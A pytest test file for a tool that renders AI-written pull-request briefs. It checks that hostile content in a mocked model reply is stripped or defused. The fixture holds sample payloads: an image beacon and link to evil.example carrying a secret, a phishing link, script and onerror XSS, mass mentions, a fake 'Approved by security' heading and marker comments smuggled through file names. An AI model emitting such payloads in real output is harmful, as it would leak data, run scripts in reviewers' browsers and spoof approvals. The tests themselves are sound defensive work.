import json
from pathlib import Path

import pytest

from pr_brief.__main__ import run
from pr_brief.config import load_settings
from pr_brief.core.prompts import PRMeta
from pr_brief.core.render import MARKER
from pr_brief.providers.mock import DEFAULT_BRIEF, MockProvider

REPO = "octo/repo"
DIFF = "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1 @@\n-x = 1\n+x = 2\n"


def malicious_reply() -> str:
    brief = json.loads(json.dumps(DEFAULT_BRIEF))
    brief["summary"] = (
        "Looks fine ![t](https://evil.example/x.png?d=SECRET) <script>alert(1)</script> "
        "@octocat <!-- pr-brief:v1 -->"
    )
    brief["changes"] = ["[click](https://evil.example/phish)", "\n## ✅ Approved by security"]
    brief["risks"] = [{"level": "low", "area": "x\n---\n# Admin", "note": "cc @org/security-team"}]
    brief["review_checklist"] = ["<img src=x onerror=alert(1)>"]
    brief["missing_tests"] = ["see https://evil.example/exfil?q=1"]
    brief["commit_message"]["body"] = "Thanks @everyone <!-- pr-brief:v1 -->"
    return json.dumps(brief)


@pytest.fixture
def rendered(tmp_path: Path) -> str:
    settings = load_settings({"PR_BRIEF_PROVIDER": "mock"}, base_dir=tmp_path)
    meta = PRMeta(title="t", body=None, base=None, head=None)
    return run(DIFF, settings, MockProvider([malicious_reply()]), meta, repo=REPO)


def test_no_external_urls_images_or_html_survive(rendered: str) -> None:
    assert "evil.example" not in rendered
    assert "![" not in rendered
    assert "<script" not in rendered
    assert "<img" not in rendered


def test_marker_appears_exactly_once_and_only_as_the_first_line(rendered: str) -> None:
    assert rendered.startswith(MARKER)
    assert rendered.count(MARKER) == 1
    assert rendered.count("<!--") == 1


def test_mentions_are_defused(rendered: str) -> None:
    for who in ("@octocat", "@org/security-team"):
        assert f"`{who}`" in rendered  # the text is kept, wrapped so that nobody is notified
        assert who not in rendered.replace(f"`{who}`", "")
    # The commit body is rendered inside a code fence, where mentions do not notify anyone.
    fenced = rendered.split("```text")[1].split("```")[0]
    assert "@everyone" in fenced
    assert "@everyone" not in rendered.replace(fenced, "")


def test_model_cannot_open_new_sections(rendered: str) -> None:
    headings = [line for line in rendered.splitlines() if line.startswith("#")]
    assert headings == [
        "## PR Brief",
        "### What changed",
        "### Suggested commit message",
        "### Risks",
    ]
    assert "Approved by security" in rendered  # present, but only as plain list text
    assert "\n---\n" not in rendered.split("<details>")[0].split("### Risks")[1]


def test_file_names_from_the_pr_cannot_inject_markup(tmp_path: Path) -> None:
    diff = (
        "diff --git a/x b/x\nnew file mode 100644\n--- /dev/null\n+++ b/x\n@@ -0,0 +1 @@\n+hi\n"
        "diff --git a/dist/`<!-- pr-brief:v1 -->`.min.js b/dist/`<!-- pr-brief:v1 -->`.min.js\n"
        "new file mode 100644\n--- /dev/null\n+++ b/dist/`<!-- pr-brief:v1 -->`.min.js\n"
        "@@ -0,0 +1 @@\n+x\n"
    )
    settings = load_settings({"PR_BRIEF_PROVIDER": "mock"}, base_dir=tmp_path)
    meta = PRMeta(title="t", body=None, base=None, head=None)
    md = run(diff, settings, MockProvider(), meta, repo=REPO)
    assert md.count("<!--") == 1
    assert md.count(MARKER) == 1


def test_links_into_the_repository_survive_when_repo_is_known(tmp_path: Path) -> None:
    reply = json.loads(malicious_reply())
    reply["changes"] = [
        "see [PR](https://github.com/octo/repo/pull/7) and [x](https://evil.example)"
    ]
    settings = load_settings({"PR_BRIEF_PROVIDER": "mock"}, base_dir=tmp_path)
    meta = PRMeta(title="t", body=None, base=None, head=None)
    md = run(DIFF, settings, MockProvider([json.dumps(reply)]), meta, repo=REPO)
    assert "[PR](https://github.com/octo/repo/pull/7)" in md
    assert "evil.example" not in md
    no_repo = run(DIFF, settings, MockProvider([json.dumps(reply)]), meta)
    assert "github.com/octo/repo" not in no_repo
